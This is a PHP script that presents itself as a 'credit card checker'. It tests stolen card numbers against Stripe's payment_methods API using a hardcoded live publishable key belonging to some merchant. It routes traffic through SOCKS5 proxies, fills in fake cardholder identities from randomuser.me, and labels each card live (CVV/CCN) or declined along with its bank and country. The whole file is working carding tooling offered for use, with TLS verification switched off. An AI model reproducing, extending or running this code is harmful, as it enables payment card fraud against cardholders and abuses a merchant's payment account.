<?php
/**
 * Combined Credit Card Checker
 * Integrates PHP and Python functionality for checking cards against Stripe
 */

// Error handling
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('UTC');

// Security headers
header('Content-Type: text/html; charset=utf-8');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');
header('X-Content-Type-Options: nosniff');

// Function to parse card details
function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

// Function to extract data from response
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

// Function to generate UUIDs
function AllinOne($data = 42) {
    return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', 
        mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), 
        mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), 
        mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);
}

// Process card details
function process_card($cc, $mes, $ano, $cvv) {
    global $useProxy, $proxyDetails, $pk, $pi;
    
    // Generate unique IDs
    $guid = AllinOne();
    $muid = AllinOne();
    $sid = AllinOne();
    
    // Get card bin information
    $bin_data = get_bin_info($cc);
    
    // Generate random user details
    $user_data = generate_user_details();
    
    // Set up proxy if requested
    if ($useProxy && !empty($proxyDetails)) {
        $proxy_config = setup_proxy($proxyDetails);
    } else {
        $proxy_config = null;
    }
    
    // Check if we have stripe keys
    if (!empty($pk) && !empty($pi)) {
        // Use Python script for direct Stripe validation
        $result = validate_with_stripe($cc, $mes, $ano, $cvv, $pk, $pi, $proxy_config);
    } else {
        // Use PHP based validation
        $result = validate_with_php($cc, $mes, $ano, $cvv, $bin_data, $user_data, $proxy_config, $guid, $muid, $sid);
    }
    
    return $result;
}

// Get BIN information
function get_bin_info($cc) {
    $bin = substr($cc, 0, 6);
    
    // First API check
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $fim = curl_exec($ch);
    curl_close($ch);
    
    // Second API check
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $bindata = curl_exec($ch);
    curl_close($ch);
    
    $binna = json_decode($bindata, true);
    
    return [
        'brand' => isset($binna['scheme']) ? $binna['scheme'] : 'Unknown',
        'type' => isset($binna['type']) ? $binna['type'] : 'Unknown',
        'bank' => isset($binna['bank']['name']) ? $binna['bank']['name'] : 'Unknown',
        'country' => isset($binna['country']['name']) ? $binna['country']['name'] : 'Unknown',
        'emoji' => GetStr($fim, '"emoji":"', '"'),
        'bin' => $bin
    ];
}

// Generate random user details
function generate_user_details() {
    $get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
    
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    $serve_arr = array("gmail.com","homtail.com","yahoo.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $postcode = $matches1[1][0];
    
    return [
        'first_name' => $first,
        'last_name' => $last,
        'email' => $email,
        'street' => $street,
        'city' => $city,
        'state' => $state,
        'phone' => $phone,
        'postcode' => $postcode
    ];
}

// Setup proxy configuration
function setup_proxy($proxy_string) {
    $components = explode(':', $proxy_string);
    
    if (count($components) === 4) {
        return [
            'proxy' => $components[0] . ':' . $components[1],
            'username' => $components[2],
            'password' => $components[3],
            'type' => 'socks5'
        ];
    } elseif (count($components) === 2) {
        return [
            'proxy' => $proxy_string,
            'username' => null,
            'password' => null,
            'type' => 'socks5'
        ];
    }
    
    return null;
}

// Validate card with Python script (Stripe direct)
function validate_with_stripe($cc, $mes, $ano, $cvv, $pk, $pi, $proxy_config) {
    $cmd = "python3 stripe_validator.py " . escapeshellarg($cc) . " " . 
           escapeshellarg($mes) . " " . 
           escapeshellarg($ano) . " " . 
           escapeshellarg($cvv) . " " . 
           escapeshellarg($pk) . " " . 
           escapeshellarg($pi);
    
    if (!empty($proxy_config)) {
        $proxy_str = $proxy_config['proxy'];
        if (!empty($proxy_config['username']) && !empty($proxy_config['password'])) {
            $proxy_str = $proxy_config['username'] . ':' . $proxy_config['password'] . '@' . $proxy_str;
        }
        $cmd .= " " . escapeshellarg($proxy_str);
    }
    
    $output = shell_exec($cmd);
    return $output;
}

// Validate card with PHP
function validate_with_php($cc, $mes, $ano, $cvv, $bin_data, $user_data, $proxy_config, $guid, $muid, $sid) {
    $start_time = microtime(true);
    
    // Create cURL session
    $ch = curl_init();
    
    // Set proxy if configured
    if (!empty($proxy_config)) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy_config['proxy']);
        
        if ($proxy_config['type'] === 'socks5') {
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        }
        
        if (!empty($proxy_config['username']) && !empty($proxy_config['password'])) {
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_config['username'] . ':' . $proxy_config['password']);
        }
    }
    
    // Common cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    
    // First request to get Stripe session
    curl_setopt($ch, CURLOPT_URL, "https://m.stripe.com/6");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept: */*",
        "Accept-Language: en-US,en;q=0.9",
        "Content-Type: application/x-www-form-urlencoded"
    ]);
    
    $result1 = curl_exec($ch);
    
    // Check for successful first request
    if (!$result1 || curl_errno($ch)) {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        return "❌ ERROR: Connection failed | Time: " . $time_taken . "s";
    }
    
    $stripe_session = json_decode($result1, true);
    
    // Second request to validate card
    $data = http_build_query([
        'type' => 'card',
        'owner[name]' => $user_data['first_name'] . ' ' . $user_data['last_name'],
        'owner[email]' => $user_data['email'],
        'owner[address][line1]' => $user_data['street'],
        'owner[address][city]' => $user_data['city'],
        'owner[address][state]' => $user_data['state'],
        'owner[address][postal_code]' => $user_data['postcode'],
        'owner[address][country]' => 'US',
        'card[number]' => $cc,
        'card[cvc]' => $cvv,
        'card[exp_month]' => $mes,
        'card[exp_year]' => $ano,
        'guid' => isset($stripe_session['guid']) ? $stripe_session['guid'] : $guid,
        'muid' => isset($stripe_session['muid']) ? $stripe_session['muid'] : $muid,
        'sid' => isset($stripe_session['sid']) ? $stripe_session['sid'] : $sid,
        'key' => 'pk_live_51HPtzNJlkQw87gXSsvRTF4Ox0k3YoLXhdiuBGRxUUaqqz9sxSKBnXQTHr5QiN2AxLOBgSMMGu8hJOARhHT1PSnH800SsRuEXWn',
        'payment_user_agent' => 'stripe.js/7315d41'
    ]);
    
    curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_methods");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    
    $result2 = curl_exec($ch);
    curl_close($ch);
    
    // Calculate time taken
    $time_taken = number_format(microtime(true) - $start_time, 2);
    
    // Process result
    if ($result2) {
        if (strpos($result2, '"id": "pm_') !== false) {
            if (strpos($result2, '"cvc_check": "pass"') !== false) {
                return "✅ #CVV - $cc|$mes|$ano|$cvv - [ Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
            } elseif (strpos($result2, '"cvc_check": "unavailable"') !== false) {
                return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
            } else {
                return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
            }
        } elseif (strpos($result2, 'rate_limit') !== false) {
            return "❌ RATE LIMIT - $cc|$mes|$ano|$cvv - [ Try again later | Time: " . $time_taken . "s ]";
        } elseif (strpos($result2, 'insufficient_funds') !== false) {
            return "✅ #CVV - $cc|$mes|$ano|$cvv - [ Insufficient Funds | Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
        } elseif (strpos($result2, 'incorrect_cvc') !== false) {
            return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Incorrect CVC | Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
        } elseif (strpos($result2, 'lost_card') !== false || strpos($result2, 'stolen_card') !== false) {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Lost/Stolen Card | Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
        } elseif (strpos($result2, 'card_decline') !== false) {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Card Declined | Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
        } elseif (strpos($result2, 'Your card does not support this type of purchase') !== false) {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Card Doesn't Support This Purchase | Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
        } elseif (strpos($result2, 'do_not_honor') !== false) {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Do Not Honor | Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
        } elseif (strpos($result2, 'generic_decline') !== false) {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Generic Decline | Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
        } elseif (strpos($result2, 'expired_card') !== false) {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Expired Card | Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
        } else {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ " . GetStr($result2, '"decline_code":"', '"') . " | Card Type: " . $bin_data['type'] . " | Level: " . $bin_data['brand'] . " | Bank: " . $bin_data['bank'] . " | Country: " . $bin_data['country'] . " " . $bin_data['emoji'] . " | Bin: " . $bin_data['bin'] . " | Time: " . $time_taken . "s ]";
        }
    } else {
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ Connection Error | Time: " . $time_taken . "s ]";
    }
}

// Process the request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get POST parameters
    $lista = $_POST['lista'] ?? '';
    $useProxy = isset($_POST['useProxy']) && $_POST['useProxy'] == 1;
    $proxyDetails = $_POST['proxyDetails'] ?? '';
    $pk = $_POST['pk'] ?? '';
    $pi = $_POST['pi'] ?? '';
    
    // Parse the card details
    $details = multiexplode(array(":", "|", " "), $lista);
    
    // Check if we have a valid card format
    if (count($details) >= 4) {
        $cc = $details[0];
        $mes = $details[1];
        $ano = $details[2];
        $cvv = $details[3];
        
        // Validate card number format
        if (!preg_match('/^[0-9]{13,19}$/', $cc)) {
            echo "❌ INVALID FORMAT - Please check the card number";
            exit;
        }
        
        // Process the card and output result
        echo process_card($cc, $mes, $ano, $cvv);
    } else {
        echo "❌ INVALID FORMAT - Use format: XXXXXXXXXXXXXXXX|MM|YYYY|CVV";
    }
} else {
    // If accessed directly without POST
    echo "❌ Invalid access method";
}
?>
